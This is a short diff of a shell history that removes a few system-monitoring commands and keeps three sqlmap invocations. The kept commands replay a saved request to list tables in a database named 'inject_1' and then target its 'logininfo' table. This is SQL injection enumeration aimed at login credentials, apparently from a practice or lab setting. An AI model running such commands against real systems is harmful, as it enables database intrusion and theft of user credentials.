@@ -1,7 +1,3 @@
-    1  man sqlmap | grep level
-    2  top
-    3  htop
-    4  top
     5  sqlmap -r /request.txt  -D inject_1 --tables --threads
     6  sqlmap -r /request.txt  -D inject_1 --tables --threads 5
     7  sqlmap -r /request.txt  -D inject_1 -T logininfo --threads 5
